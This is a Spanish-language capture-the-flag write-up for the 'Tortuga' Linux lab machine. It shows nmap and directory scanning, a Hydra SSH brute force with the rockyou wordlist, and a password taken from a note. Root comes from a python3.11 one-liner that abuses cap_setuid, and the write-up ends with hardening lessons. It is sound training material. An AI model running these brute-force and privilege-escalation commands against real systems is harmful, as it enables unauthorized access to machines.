# Tortuga

**Plataforma:** The Hackers Labs
**Dificultad:** Fácil
**OS:** Linux
**Fecha:** 22/07/2026

## 0. Resumen

Máquina Linux fácil con temática pirata. El camino de explotación combina:

- Enumeración web para obtención de posibles nombres de usuario
- Fuerza bruta SSH con Hydra para acceso inicial
- Escalada horizontal a un segundo usuario mediante archivo oculto
- Escalada a root abusando de una Linux capability (`cap_setuid`) asignada a `python3.11`

---

## 1. Reconocimiento

   Ping

```bash
ping -c 1 <IP>
```

Un TTL de 64 sugiere que se trata de un host Linux

### Nmap

```bash
nmap -sCV -Pn -n --open -p- --min-rate 5000 -oA tortuga

-sCV:
-Pn:
-n:
--open:
-p-:
--min-rate
```

```bash
sudo nmap -p22,80 -sCV -Pn -n --min-rate 5000 <IP>
```

**Resultados:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Isla Tortuga
```

- Puerto 22: SSH (OpenSSH 9.2p1, Debian 12)
- Puerto 80: Apache 2.4.62, sitio "Isla Tortuga"

---

## 3. Enumeración web

### 3.1 Navegación inicial

La página principal ofrece dos enlaces:

- **Ver el mapa de la isla** → `mapa.php`
- **Conocer la tripulación** → `tripulacion.php`

### 3.2 Descubrimiento de la pista

En `mapa.php` aparece un mensaje dirigido al jugador:

> *"Ey grumete, revisa la nota oculta que he dejado en tu camarote…"*

→ Confirma la existencia de un usuario del sistema llamado **`grumete`** y anticipa un archivo oculto en su home.

### 3.3 Fuzzing de directorios (verificación adicional)

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64
```

```bash
dirb http://<IP>/
```

No se encuentran rutas adicionales relevantes; el vector principal sigue siendo la pista de `mapa.php`.

---

## 4. Acceso inicial — Fuerza bruta SSH

### 4.1 Hydra

```bash
hydra -l grumete -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 64
```

| Flag | Función |
|---|---|
| `-l grumete` | Usuario objetivo fijo |
| `-P rockyou.txt` | Diccionario de contraseñas |
| `ssh://<IP>` | Protocolo y dirección objetivo |
| `-t 64` | Hilos en paralelo |

→ Credenciales válidas: **`grumete : 1234`**

### 4.2 Conexión SSH

```bash
ssh grumete@<IP>
```

### 4.3 Primera flag y pista para el siguiente usuario

```bash
ls -la /home/grumete
cat /home/grumete/nota
```

→ La nota revela la contraseña del usuario **`capitan`**.

*Verificación adicional de usuarios del sistema:*

```bash
cat /etc/passwd | grep -E "/bin/bash|/bin/sh"
```

---

## 5. Escalada de privilegios horizontal

```bash
su capitan
```

Cambio de un usuario sin privilegios especiales a otro con el mismo nivel de privilegios, usando la contraseña obtenida en la nota.

---

## 6. Escalada a root — Linux Capabilities

### 6.1 Enumeración de capabilities y SUID

```bash
getcap -r / 2>/dev/null
find / -perm -4000 2>/dev/null
```

→ Hallazgo clave: `/usr/bin/python3.11 = cap_setuid+ep`

### 6.2 ¿Qué significa `cap_setuid=ep`?

Las Linux capabilities dividen los privilegios de root en unidades otorgables individualmente a binarios concretos. `cap_setuid` permite a un proceso invocar `setuid()` y cambiar su propio UID — normalmente reservado a root. Los sufijos `e` (*effective*) y `p` (*permitted*) indican que la capacidad está activa y disponible de inmediato.

El problema: al tratarse de un intérprete tan flexible como Python, cualquier usuario que pueda ejecutarlo puede usar esa capability para autoconcederse UID 0. Vector documentado en [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities).

### 6.3 Explotación

```bash
/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

| Instrucción | Función |
|---|---|
| `import os` | Módulo de sistema operativo de Python |
| `os.setuid(0)` | Usa la capability para poner el UID del proceso a 0 (root) |
| `os.system("/bin/bash")` | Lanza una shell heredando ese UID |

→ Shell con privilegios de root.

### 6.4 Segunda flag

```bash
cat /root/root.txt
```

---

## 7. Lecciones aprendidas

- **Contraseñas débiles:** políticas de contraseñas robustas y, si es posible, autenticación SSH solo por clave pública.
- **Fuerza bruta:** Fail2ban o rate limiting en SSH para frenar ataques tipo Hydra.
- **Credenciales en texto claro:** no dejar contraseñas en notas dentro de los homes, ni pistas públicas que revelen nombres de cuentas válidas.
- **Auditoría de capabilities:** `getcap -r /` debería formar parte de un hardening periódico. Asignar `cap_setuid` (o cualquier capability potente) a un intérprete de propósito general equivale, en la práctica, a darle SUID root.
- **Principio de mínimo privilegio:** si un binario necesita una capability puntual, es mejor envolver esa funcionalidad en un binario dedicado y auditable en lugar de otorgarla a un intérprete completo.
